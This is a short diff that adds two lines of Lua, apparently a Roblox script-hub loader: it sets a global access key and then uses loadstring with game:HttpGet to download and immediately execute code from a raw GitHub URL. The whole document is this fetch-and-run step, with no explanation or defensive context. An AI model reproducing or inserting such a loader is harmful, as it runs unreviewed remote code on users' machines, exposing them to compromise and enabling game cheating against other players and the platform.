@@ -1,0 +1,2 @@
+_G.Key = "HSkghL5btD3PrJ17OsPn"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ZoiIntra/Loyz/main/Luncher'))()
